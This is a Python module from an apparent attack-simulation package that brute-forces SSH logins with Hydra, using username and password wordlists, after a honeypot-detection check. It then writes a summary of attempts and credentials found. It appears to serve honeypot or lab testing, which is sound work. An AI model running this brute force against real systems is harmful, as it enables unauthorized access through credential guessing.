from __future__ import annotations

import logging
from dataclasses import dataclass, field
from pathlib import Path

from attacker.attacks.common import (
    ResultsDir,
    is_reachable,
    make_results_dir,
    resolve_password_wordlist,
    resolve_username_wordlist,
    run_hydra,
)
from attacker.attacks.honeypot import analyze_logins, detect_ssh, warn_if_suspected

logger = logging.getLogger(__name__)


@dataclass(frozen=True)
class SshBruteforceConfig:
    target_host: str
    target_port: int = 2222
    hydra_tasks: int = 16
    hydra_timeout: int = 120
    ssh_timeout: float = 8.0
    pause_between_manual: float = 0.5
    pause_before_assertions: float = 10.0
    skip_hydra: bool = False
    password_wordlist: Path | None = None
    username_wordlist: Path | None = None


@dataclass
class SshBruteforceReport:
    target: str
    hydra_attempts: int = 0
    hydra_credentials_found: int = 0
    honeypot_suspected: bool = False
    skipped_phases: list[str] = field(default_factory=list)
    exit_code: int = 0


def run(
    config: SshBruteforceConfig,
    reports_dir: Path,
) -> SshBruteforceReport:
    report = SshBruteforceReport(
        target=f"ssh://{config.target_host}:{config.target_port}"
    )

    results = make_results_dir(reports_dir, prefix="ssh")
    logger.info("Artefacts directory: %s", results.path)

    if not is_reachable(config.target_host, config.target_port):
        logger.error(
            "SSH target unreachable at %s:%d", config.target_host, config.target_port
        )
        report.exit_code = 2
        return report
    logger.info("SSH target reachable")

    # Pre-attack passive/active honeypot check (banner + default/decoy logins).
    verdict = detect_ssh(config.target_host, config.target_port)

    username_wordlist = resolve_username_wordlist(config.username_wordlist)
    password_wordlist = resolve_password_wordlist(config.password_wordlist)

    if config.skip_hydra:
        report.skipped_phases.append("hydra")
        logger.warning("Phase 1 skipped (--skip-hydra)")
    elif password_wordlist is None:
        logger.error("No password wordlist available; skipping hydra phase")
        report.skipped_phases.append("hydra")
    elif username_wordlist is None:
        logger.error("No username wordlist available; skipping hydra phase")
        report.skipped_phases.append("hydra")
    else:
        attempts, found = run_hydra(
            "ssh",
            config.target_host,
            config.target_port,
            config.hydra_tasks,
            config.hydra_timeout,
            username_wordlist,
            password_wordlist,
            results,
        )
        report.hydra_attempts = attempts
        report.hydra_credentials_found = len(found)

        analyze_logins(verdict, found, protocol="ssh", indicator="ssh-bruteforce")

    report.honeypot_suspected = warn_if_suspected(verdict, logger)

    _write_summary(results, report)
    return report


def _write_summary(results: ResultsDir, report: SshBruteforceReport) -> None:
    lines = [
        f"target: {report.target}",
        f"hydra_attempts: {report.hydra_attempts}",
        f"hydra_credentials_found: {report.hydra_credentials_found}",
        f"honeypot_suspected: {report.honeypot_suspected}",
        f"skipped_phases: {','.join(report.skipped_phases) or 'none'}",
        f"exit_code: {report.exit_code}",
    ]

    results.file("summary.txt").write_text("\n".join(lines), encoding="utf-8")
